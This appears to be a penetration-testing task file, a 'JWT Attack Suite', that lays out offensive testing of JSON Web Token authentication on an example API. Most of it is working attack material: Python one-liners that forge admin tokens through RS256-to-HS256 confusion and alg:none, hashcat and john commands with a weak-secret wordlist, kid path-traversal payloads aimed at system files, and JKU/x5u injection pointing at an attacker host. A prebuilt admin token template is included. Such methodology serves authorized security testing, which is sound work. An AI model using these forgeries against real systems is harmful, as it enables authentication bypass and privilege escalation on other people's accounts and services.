# Tasks — JWT Attack Suite

Comprehensive JWT testing covering algorithm confusion, weak secrets, header injection, and all common JWT vulnerabilities.

---

## Table of Contents

1. [JWT Overview](#1-jwt-overview)
2. [JWT Sink Identification](#2-jwt-sink-identification)
3. [Token Capture](#3-token-capture)
4. [Algorithm Confusion](#4-algorithm-confusion)
5. [Weak Secret Testing](#5-weak-secret-testing)
6. [kid Injection](#6-kid-injection)
7. [Claim Manipulation](#7-claim-manipulation)
8. [JWT Structure Analysis](#8-jwt-structure-analysis)
9. [None Algorithm Bypass](#9-none-algorithm-bypass)
10. [Advanced JWT Attacks](#10-advanced-jwt-attacks)
11. [Evidence Collection](#11-evidence-collection)
12. [JWT Templates](#12-jwt-templates)
13. [Maintenance](#13-maintenance)

---

## 1. JWT Overview

### 1.1 Summary

```
JWT SCANS COMPLETED: [N]
  alg:none tested: [N]
  alg:none confirmed: [N]
  RS256->HS256 tested: [N]
  RS256->HS256 confirmed: [N]
  Weak secret found: [N]
  kid injection tested: [N]
  kid injection confirmed: [N]

SUCCESS RATE:
  alg:none: [N]%
  RS256->HS256: [N]%
  Weak secret: [N]%
  kid injection: [N]%
```

### 1.2 Task ID Format

```
JWT TASK ID: JWT-{target_short}-{YYMMDD}-{XXX}
  target_short: First 5 chars of target domain
  YYMMDD: Date of scan
  XXX: Sequential number

Example: JWT-exampl-240607-001
```

### 1.3 JWT Attack Lifecycle

```
TARGET IDENTIFIED → SINK DISCOVERY → TOKEN CAPTURE
    → STRUCTURE ANALYSIS → ALGORITHM TESTING
    → SECRET CRACKING → KID TESTING
    → CLAIM MANIPULATION → FORGED TOKEN
    → PRIVILEGE TEST → FINDING DOCUMENTED
```

---

## 2. JWT Sink Identification

### 2.1 Task: Identify JWT Implementation

```
TASK ID: JWT-SINK-001
TARGET: api.example.com
STATUS: Planned
TOOLS: url_collector.py, manual inspection

JWT SINK INDICATORS:
  - Authorization header: Bearer <token>
  - Cookie with token: jwt=, token=, access_token=
  - URL parameter: ?token=, ?jwt=
  - JWK endpoint: /.well-known/jwks.json, /api/jwks.json
  - Public key endpoint: /api/publickey, /publickey.pem
  - Auth endpoints: /login, /register, /refresh

JWT SINK DISCOVERY:
  [ ] Search for Authorization headers in requests
  [ ] Check response cookies for JWT tokens
  [ ] Look for JWK endpoints
  [ ] Check auth endpoints for JWT issuance
  [ ] Review JS bundles for JWT handling

JWT SINK COMMANDS:
  # Find JWT tokens in requests
  Get-ChildItem captures/*.har | Select-String -Pattern "Bearer eyJ" | Select-Object -First 10

  # Find JWK endpoints
  $endpoints = @("/.well-known/jwks.json", "/api/jwks.json", "/jwks.json", "/api/publickey", "/publickey.pem")
  foreach ($ep in $endpoints) {
    $response = curl -s -o NUL -w "%{http_code}" "https://api.example.com$ep"
    Write-Host "$ep : $response"
  }
```

### 2.2 JWT Sink Analysis

```
CONFIRMED JWT SINKS (example.com):
  | Endpoint | Token Location | Algorithm | Auth Required |
  |----------|---------------|-----------|---------------|
  | POST /api/auth/login | Response body | RS256 | No |
  | GET /api/users/me | Authorization header | RS256 | Yes |
  | POST /api/auth/refresh | Request body | RS256 | Yes |

JWK ENDPOINTS:
  /.well-known/jwks.json: 200 OK
  /api/jwks.json: 404 Not Found
  /api/publickey: 404 Not Found

PUBLIC KEY:
  Algorithm: RS256
  Key found: Yes (from /.well-known/jwks.json)
  Key size: 2048 bit
```

---

## 3. Token Capture

### 3.1 Task: Capture Valid JWT Token

```
TASK ID: JWT-CAPTURE-001
TARGET: api.example.com
STATUS: Planned

TOKEN CAPTURE STEPS:
  [ ] Register test account
  [ ] Login and capture token
  [ ] Test token validity
  [ ] Decode token to inspect claims
  [ ] Document token structure

CAPTURE COMMANDS:
  # Register test account
  $regBody = @{
    email = "jwt-test+$(Get-Random)@test.com"
    password = "TestJWT123!"
  } | ConvertTo-Json
  $regResponse = Invoke-RestMethod -Uri "https://api.example.com/api/auth/register" -Method POST -Body $regBody -ContentType "application/json"

  # Login and capture token
  $loginBody = @{
    email = "jwt-test@test.com"
    password = "TestJWT123!"
  } | ConvertTo-Json
  $loginResponse = Invoke-RestMethod -Uri "https://api.example.com/api/auth/login" -Method POST -Body $loginBody -ContentType "application/json"
  $token = $loginResponse.token

  # Decode token
  $parts = $token.Split('.')
  $header = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[0]))
  $payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[1] + "=="))
  Write-Host "Header: $header"
  Write-Host "Payload: $payload"
```

### 3.2 Token Analysis

```
CAPTURED TOKEN ANALYSIS:

TOKEN: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

HEADER (Base64 decoded):
  {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "key-2024-01"
  }

PAYLOAD (Base64 decoded):
  {
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516239022,
    "role": "user"
  }

SIGNATURE: RS256 with private key (kid: key-2024-01)

KEY FINDINGS:
  - Algorithm: RS256 (asymmetric)
  - kid present: "key-2024-01"
  - Role claim: "user" (not admin)
  - No expiration claim (or far future)
  - No audience validation
```

---

## 4. Algorithm Confusion

### 4.1 Task: Test RS256 -> HS256 Confusion

```
TASK ID: JWT-CONFUSE-001
TARGET: api.example.com
STATUS: Planned
PRIORITY: P1

ALGORITHM CONFUSION THEORY:
  Server expects RS256 (asymmetric)
  Server verifies using public key
  Attacker uses public key as HMAC secret
  Attacker signs with HS256 using public key
  Server uses same key for verification (flawed implementation)

STEPS:
  [ ] Retrieve JWK from /.well-known/jwks.json
  [ ] Extract public key (n and e values)
  [ ] Convert JWK to PEM format
  [ ] Sign forged JWT with HS256 using public key as secret
  [ ] Send forged token to server
  [ ] Check if accepted

CONFUSION COMMANDS:
  # Fetch JWK
  $jwk = Invoke-RestMethod -Uri "https://api.example.com/.well-known/jwks.json"
  $jwk | ConvertTo-Json -Depth 5

  # Convert JWK to PEM (using Python)
  python -c "
import jwt, json
with open('jwk.json') as f:
    jwk_data = json.load(f)
public_key = jwt.algorithms.RSAAlgorithm.from_jwk(jwk_data)
pem = public_key.save_pkcs1().decode()
print(pem)
with open('public.pem', 'w') as f:
    f.write(pem)
"
```

### 4.2 Algorithm Confusion Payload Generation

```powershell
# Generate HS256 token using public key as secret
python -c "
import jwt
import json

# Load public key
with open('public.pem', 'r') as f:
    public_key = f.read()

# Forge token with admin claims
payload = {
    'sub': '1234567890',
    'name': 'Attacker',
    'role': 'admin',
    'iat': 1516239022
}

# Sign with HS256 using public key as secret
forged = jwt.encode(payload, public_key, algorithm='HS256')
print(f'Forged token: {forged}')
"
```

---

## 5. Weak Secret Testing

### 5.1 Task: Crack JWT Secret

```
TASK ID: JWT-SECRET-001
TARGET: api.example.com
STATUS: Planned
PRIORITY: P1

WEAK SECRET TESTING:
  [ ] Capture valid JWT token
  [ ] Try common weak secrets
  [ ] Use hashcat/john if token available
  [ ] If secret found, forge admin token

COMMON SECRETS:
  secret
  secret123
  password
  123456
  changeme
  appname
  target
  key
  private-key
  jwt-secret
  jwt_secret
  your-256-bit-secret
  supersecret
  development
  prod

SECRET CRACKING COMMANDS:
  # Using hashcat
  echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" > jwt.txt
  hashcat -m 16500 jwt.txt wordlists/jwt-secrets.txt

  # Using john
  john --format=jwt jwt.txt --wordlist=wordlists/jwt-secrets.txt

  # Using Python
  python tools/python/auth_hunter.py https://api.example.com/api/users/me --token "$TOKEN" --crack-secret
```

---

## 6. kid Injection

### 6.1 Task: Test kid Path Traversal

```
TASK ID: JWT-KID-001
TARGET: api.example.com
STATUS: Planned
PRIORITY: P2

KID INJECTION PAYLOADS:
  Path Traversal:
    - {"kid":"../../../../dev/null"}
    - {"kid":"../../../etc/passwd"}
    - {"kid":"../../../app/config/secret.key"}

  Absolute Path:
    - {"kid":"/etc/passwd"}
    - {"kid":"/dev/null"}
    - {"kid":"/proc/self/environ"}

  Null/Empty:
    - {"kid":""}
    - {"kid":null}
    - {"kid":"*"}
    - {"kid":"./"}

KID INJECTION COMMANDS:
  # Test path traversal
  python -c "
import jwt
import json

header = {'alg': 'HS256', 'typ': 'JWT', 'kid': '../../../../dev/null'}
payload = {'sub': 'admin', 'role': 'admin'}
token = jwt.encode(payload, '', algorithm='HS256', headers=header)
print(token)
"
```

---

## 7. Claim Manipulation

### 7.1 Task: Manipulate JWT Claims

```
TASK ID: JWT-CLAIMS-001
TARGET: api.example.com
STATUS: Planned

CLAIM MANIPULATION:
  [ ] Change role to admin
  [ ] Change sub to victim user ID
  [ ] Add new permissions
  [ ] Extend expiration
  [ ] Add bypass claims

COMMON CLAIMS TO MODIFY:
  - sub: User identifier
  - role: User role (user → admin)
  - permissions: ["*"] or ["admin:*"]
  - is_admin: true
  - verified: true
  - account_type: "premium"
  - exp: Extend expiration (far future)

CLAIM MANIPULATION COMMANDS:
  # Using alg:none
  python -c "
import base64, json

header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"
```

---

## 8. JWT Structure Analysis

### 8.1 Task: Analyze JWT Implementation

```
TASK ID: JWT-STRUCT-001
TARGET: api.example.com
STATUS: Planned

JWT STRUCTURE CHECKS:
  [ ] Header algorithm (alg)
  [ ] Token type (typ)
  [ ] Key ID (kid)
  [ ] Subject (sub)
  [ ] Issuer (iss)
  [ ] Audience (aud)
  [ ] Expiration (exp)
  [ ] Not before (nbf)
  [ ] Issued at (iat)
  [ ] JWT ID (jti)

IMPLEMENTATION FLAWS TO CHECK:
  - Algorithm not validated
  - Signature not validated
  - Expiration not validated
  - Audience not validated
  - Issuer not validated
  - kid not validated (path traversal)
  - None accepted in alg
```

---

## 9. None Algorithm Bypass

### 9.1 Task: Test alg:none

```
TASK ID: JWT-NONE-001
TARGET: api.example.com
STATUS: Active
PRIORITY: P1

ALG:NONE TESTING:
  [ ] Send token with "alg":"none" (lowercase)
  [ ] Test case variations
  [ ] Test null/undefined values
  [ ] Document successful bypass

ALG:NONE VARIATIONS:
  - "alg":"none" (lowercase - most common)
  - "alg":"None" (capitalized)
  - "alg":"NONE" (uppercase)
  - "alg":"nOnE" (mixed case)
  - "alg":"null"
  - "alg":"undefined"

ALG:NONE COMMANDS:
  python -c "
import base64, json

header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"
```

---

## 10. Advanced JWT Attacks

### 10.1 Task: Advanced JWT Testing

```
TASK ID: JWT-ADV-001
TARGET: api.example.com
STATUS: Planned

ADVANCED ATTACKS:
  [ ] JWK injection (fake JWK endpoint)
  [ ] JKU header manipulation
  [ ] x5u header manipulation
  [ ] Critical header injection
  [ ] JWT with embedded JWK
  [ ] Nested JWT (JWT inside JWT)

JKU INJECTION:
  - Set "jku":"https://attacker.com/jwk.json"
  - Host fake JWK with attacker-controlled key
  - Server fetches JWK from attacker URL

X5U INJECTION:
  - Set "x5u":"https://attacker.com/cert.pem"
  - Similar to JKU but with X.509 certificates
```

---

## 11. Evidence Collection

### 11.1 Task: Collect JWT Evidence

```
EVIDENCE REQUIRED:
  [ ] Original captured token
  [ ] Forged token
  [ ] Request with forged token
  [ ] Response showing elevated access
  [ ] Screenshot of admin functionality

EVIDENCE PACKAGE:
  evidence/jwt-exampl-240607/
    ├── README.md
    ├── original-token.txt
    ├── forged-token.txt
    ├── forged-header.json
    ├── forged-payload.json
    ├── request.curl
    ├── screenshot-admin-access.png
    └── impact-demo.md
```

---

## 12. JWT Templates

### 12.1 alg:none Template

```json
Header: {"alg":"none","typ":"JWT"}
Payload: {"sub":"admin","role":"admin"}
Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

### 12.2 RS256->HS256 Template

```json
Header: {"alg":"HS256","typ":"JWT","kid":"key-2024-01"}
Payload: {"sub":"admin","role":"admin","iat":1516239022}
Secret: [public key from JWK in PEM format]
```

---

## 13. Maintenance

### 13.1 JWT Toolchain Maintenance

```
DAILY:
  [ ] Update common secrets wordlist
  [ ] Add new bypass variations

WEEKLY:
  [ ] Test JWT tools against new targets
  [ ] Update payload library

MONTHLY:
  [ ] Research new JWT vulnerabilities
  [ ] Update JWT attack techniques
```

---

*End of jwt-attack-suite.md*
